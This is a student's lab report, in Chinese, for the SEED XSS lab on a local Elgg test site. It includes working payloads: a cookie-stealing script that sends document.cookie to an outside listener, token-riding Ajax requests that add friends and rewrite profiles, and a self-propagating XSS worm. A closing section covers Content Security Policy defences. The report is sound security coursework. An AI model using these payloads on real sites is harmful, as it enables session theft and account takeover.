# LAB6 XSS
## 环境搭建
### DNS配置
使用`sudo nano hosts`来修改hosts文件如下：
![[Pasted image 20261105181612.png|371]]
### 容器配置
![[Pasted image 20261105182313.png|468]]

## 任务1 发布恶意消息以显示警告窗口
HTTP Header Live工具捕获HTTP请求如下：
![[Pasted image 20261105182751.png|471]]
在boby的profile中的brief description嵌入代码`<script>alert('XSS');</script>`：
![[Pasted image 20261105183333.png|465]]
保存后弹出警告，其他用户访问时也一样弹出：
![[Pasted image 20261105183351.png|299]]

## 任务2 显示受害者的Cookie
在brief description里嵌入代码`<script>alert(document.cookie);</script>`
![[Pasted image 20261105183526.png|389]]
## 任务3 窃取Cookie
嵌入代码`<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');</script>`
![[Pasted image 20261105184009.png|527]]
## 任务4 成为受害者的“好友”
使用Web Developer Tool查看加好友请求：
![[Pasted image 20261105184510.png|570]]
可以看出url是`"http://www.seed-server.com/action/friends/add?friend=59" + ts + token`
```JavaScript
<script type="text/javascript">
window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//构建添加Samy为好友的HTTP请求。
	var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
	//创建并发送Ajax请求，以添加好友
	Ajax=new XMLHttpRequest();
	Ajax.open("GET",sendurl,true);
	Ajax.send();
}
</script>
```
![[Pasted image 20261105190413.png|238]]
### 问题1
目的是绕过服务器的CSRF防护机制，获取当前登录用户的“安全通行证”，从而让伪造的 AJAX 请求能够被服务器接受。没有这两句的话请求会被发现是伪造的而被拒绝
### 问题2
不能，因为恶意程序会被当成文本展示，而不会被执行。

## 任务5 修改受害者的资料
![[Pasted image 20261105191046.png|533]]
通过捕获的HTTP请求可以发现，
```JavaScript
<script type="text/javascript">
window.onload=function(){
	//获取username, user guid,TimeStamp __elgg_ts，和SecurityToken__elgg_token
	var userName="&name="+elgg.session.user.name;
	var guid="&guid="+elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//构造URL的内容
	var content=ts + token + guid + userName + "&description=Modified HAHA&accesslevel[description]=2";
	var samyGuid = 59;
	var sendurl = "http://www.seed-server.com/action/profile/edit";
	if(elgg.session.user.guid!=samyGuid)
	{
		// 创建并发送AJAX请求，以修改个人资料
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST", sendurl, true);
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}
</script>
```
![[Pasted image 20261105193117.png|487]]
### 问题3
为了防止samy保存profile后攻击代码修改掉samy自己的profile导致攻击无法成功。
## 任务6 编写自我传播的XSS蠕虫
```JavaScript
<script id="worm" type="text/javascript">
window.onload = function () {
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">"; // 1. 头部标签
    var jsCode = document.getElementById("worm").innerHTML;         // 2. 获取自身代码主体
    var tailTag = "</" + "script>";                                 // 3. 尾部标签

    // 4. 将完整的蠕虫代码进行 URL 编码
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

    // 获取 Token 和当前用户的 GUID
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var samyGuid = 59; // Samy 的固定 ID

    // 构造 POST 请求的 Body，将 wormCode 作为 description 的值
    var content = ts + token + guid + userName +
                  "&description=" + wormCode +
                  "&accesslevel[description]=2";

    var sendurl = "http://www.seed-server.com/action/profile/edit";

    // 如果当前访问者不是 Samy，则执行攻击和传播
    if (elgg.session.user.guid != samyGuid) {

        // --- 动作 1：修改受害者资料并植入蠕虫 ---
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);

        // --- 动作 2：自动添加 Samy 为好友 ---
        var ts_friend = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token_friend = "&__elgg_token=" + elgg.security.token.__elgg_token;
        var sendurl_friend = "http://www.seed-server.com/action/friends/add?friend=59" + ts_friend + token_friend;

        var Ajax2 = null;
        Ajax2 = new XMLHttpRequest();
        Ajax2.open("GET", sendurl_friend, true);
        Ajax2.send();
    }
}
</script>
```
可以看到boby访问samy主页后蠕虫自动复制了一份到boby的profile里。
![[Pasted image 20261105193856.png|541]]

## 任务7 使用CSP防御XSS攻击
### 1
![[Pasted image 20261105194522.png|330]]
32a完全没有 CSP 头，浏览器不限制任何来源，6 段脚本全部执行 → 6 个区域全 OK。
![[Pasted image 20261105194547.png|334]]
**32b** 策略是 `default-src 'self'; script-src 'self' *.example70.com`：
- `script-src` 里没有 `'unsafe-inline'`，也没有 nonce/hash，所以所有内联 `<script>` 都被拒绝 → 区域 1、2、3 全部 `Failed`
- 区域 4 的 `script_area4.js` 是同源相对路径，命中 `'self'` → `OK`；
- 区域 5 的源是 `www.example60.com`，不在白名单 → `Failed`；区域 6 命中 `*.example70.com` → `OK`。
![[Pasted image 20261105194609.png|335]]
- 32c 策略是 `default-src 'self'; script-src 'self' 'nonce-111-111-111' *.example70.com`：
    - 区域 1 的 `nonce` 与策略里的 `'nonce-111-111-111'` 完全一致 → 允许执行 → `OK`；区域 2 的 `222-222-222` 不在策略里，区域 3 根本没有 nonce → `Failed`。这正好说明 nonce 是"逐个比对"的，不是"有 nonce 就放行"；
    - 区域 4 命中 `'self'`、区域 6 命中 `*.example70.com` → `OK`；区域 5 仍被拒。
### 2
点击32a的按钮弹出弹窗
![[Pasted image 20261105195330.png|377]]
点击32b32c无反应
按钮用的是内联事件处理器 `<button onclick="alert('JS Code executed!')">`。`onclick=` 这种属性形式的代码也属于"内联脚本"，同样受 `script-src` 管。32b/32c 的 `script-src` 里既没有 `'unsafe-inline'`，onclick 属性上又没有带 nonce，所以整段处理器被丢弃
### 3
给32b的apache中添加`*.example60.com`
```JavaScript
<VirtualHost *:80>
      DocumentRoot /var/www/csp
      ServerName www.example32b.com
      DirectoryIndex index.html
      Header set Content-Security-Policy " \
                 default-src 'self'; \
                 script-src 'self' *.example60.com *.example70.com \
             "
</VirtualHost>
```
![[Pasted image 20261105200718.png|415]]
### 4
修改php为
```php
<?php
  $cspheader = "Content-Security-Policy:".
               "default-src 'self';".
               "script-src 'self' 'nonce-111-111-111' 'nonce-222-222-222' ".
               "*.example60.com *.example70.com";
  header($cspheader);
?>

<?php include 'index.html';?>
```
![[Pasted image 20261105200839.png|432]]
### 5
CSP 让服务器在响应头里显式声明可信的代码来源，避免了XSS将代码与数据混在一起，另外，CSP默认拒绝内联代码，在 `script-src` 未包含 `'unsafe-inline'`（或 nonce/hash）时，注入的 `<script>...</script>`、`onclick=`、`javascript:` 一律不执行。外部脚本也统一走白名单，`<script src=...>` 只能加载策略里列出的源（`'self'`、`*.example70.com` 等）。